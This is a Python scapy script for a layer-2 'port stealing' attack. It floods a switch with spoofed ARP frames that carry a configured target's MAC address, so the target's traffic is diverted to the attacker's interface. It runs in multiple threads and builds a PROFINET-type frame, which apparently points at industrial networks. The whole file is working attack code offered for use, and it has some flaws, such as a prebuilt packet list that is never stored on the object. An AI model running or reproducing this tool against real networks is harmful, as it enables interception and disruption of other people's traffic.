#!/usr/bin/env python3

from scapy.all import *
from configmgr import ConfigMgr
import time

class PortStealing():

    def __init__(self):

        cm = ConfigMgr()

        self.PREBUILD_LIST=False
        self.PREBUILD_SINGLE=False
        self.L2SOCKET=True
        self.REPLY=True
        self.TARGET_MAC = cm.getValue("Target", "mac", "08:00:06:99:4a:ad")
        self.IFACE= cm.getValue("Attacker", "iface", "enp0s25")
        self.ATTACKER_MAC = cm.getValue("Attacker", "mac", "00:11:43:6e:6b:fc")
        self.THREADS = cm.getValue("Attacker", "port_stealing_threads", 5)

        self.is_running=True

        ##### PREBUILD PACKETS
        if self.PREBUILD_LIST:
            arp_reply = Ether(src=self.TARGET_MAC, dst=self.ATTACKER_MAC) / ARP(op="is-at", hwsrc=self.TARGET_MAC, hwdst=self.ATTACKER_MAC)
            arp_request = Ether(src=self.TARGET_MAC, dst=self.ATTACKER_MAC) / ARP(op="who-has", hwsrc=self.TARGET_MAC, hwdst=self.ATTACKER_MAC)
            pkt_list = []
            for line in range(0,10000):
                 # Build and send packet
                 pkt_list.append(arp_reply)

    def steal_port(self):
        arp_reply = Ether(src=self.TARGET_MAC, dst=self.ATTACKER_MAC) / ARP(op="is-at", hwsrc=self.TARGET_MAC, hwdst=self.ATTACKER_MAC)
        arp_request = Ether(src=self.TARGET_MAC, dst=self.ATTACKER_MAC) / ARP(op="who-has", hwsrc=self.TARGET_MAC, hwdst=self.ATTACKER_MAC)
        pnio =  Ether(src=self.TARGET_MAC, dst=self.ATTACKER_MAC, type=0x8892)
        pnio.show2()
        if self.L2SOCKET:
            s = conf.L2socket(iface=self.IFACE)
            print("L2SOCKET MODE")
            while (self.is_running):
                if self.REPLY:
                   s.send(arp_reply)
                else:
                   s.send(arp_request)

        elif self.PREBUILD_LIST:
            print("PREBUILD LIST MODE")
            while(self.is_running):
                sendp(self.pkt_list, iface=self.IFACE, inter=0, verbose=False)

        elif self.PREBUILD_SINGLE:
            print("PREBUILD SINGLE MODE")
            while (self.is_running):
                sendp(arp_reply, iface=self.IFACE, inter=0, verbose=False)

if __name__ == '__main__':
    ps = PortStealing()
    for x in range(0, int(ps.THREADS)):
        print("Start thread ", str(x))
        steal_thread = Thread(target=ps.steal_port)
        steal_thread.start()


    input("Press any key to finish port stealing...")
    ps.is_running=False
